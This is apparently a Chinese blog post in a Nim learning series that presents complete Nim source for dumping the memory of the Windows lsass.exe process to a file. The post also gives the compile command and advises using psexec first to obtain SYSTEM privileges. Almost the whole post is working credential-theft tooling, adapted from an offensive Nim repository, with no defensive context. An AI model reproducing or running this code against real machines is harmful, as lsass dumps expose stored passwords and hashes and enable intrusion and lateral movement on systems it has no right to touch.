# dump lsass（nim 学习系列）

可以先使用 psexec 获取 system 权限在导出。

nim compile -d:release --opt:size dumpLsass.nim

``` dumpLsass.nim
#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples
    License: BSD 3-Clause
    Referer: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/minidump_bin.nim
]#

import winim

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0

when isMainModule:
    let processId: int = GetLsassPid()
    if not bool(processId):
        echo "[X] Unable to find lsass process"
        quit(1)

    echo "[*] lsass PID: ", processId

    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
    if not bool(hProcess):
        echo "[X] Unable to open handle to process"
        quit(1)

    try:
        var fs = open(r"C:\Users\dell\Desktop\test\lsass.dump", fmWrite)
        echo "[*] Creating memory dump, please wait..."
        var success = MiniDumpWriteDump(
            hProcess,
            cast[DWORD](processId),
            fs.getOsFileHandle(),
            0x00000002,
            nil,
            nil,
            nil
        )
        echo "[*] Dump successful: ", bool(success)
        fs.close()
    finally:
        CloseHandle(hProcess)
```

![截图](https://files-cdn.cnblogs.com/files/StudyCat/dump.bmp)

